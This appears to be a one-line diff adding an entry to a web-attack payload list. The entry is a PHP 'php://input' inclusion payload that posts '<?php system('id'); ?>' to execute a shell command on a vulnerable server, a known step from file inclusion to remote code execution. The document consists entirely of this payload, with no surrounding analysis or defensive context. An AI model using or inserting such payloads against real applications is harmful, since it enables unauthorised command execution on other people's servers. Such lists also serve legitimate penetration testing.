@@ -1,0 +1,1 @@
+php://input -X POST --data "<?php system('id'); ?>"
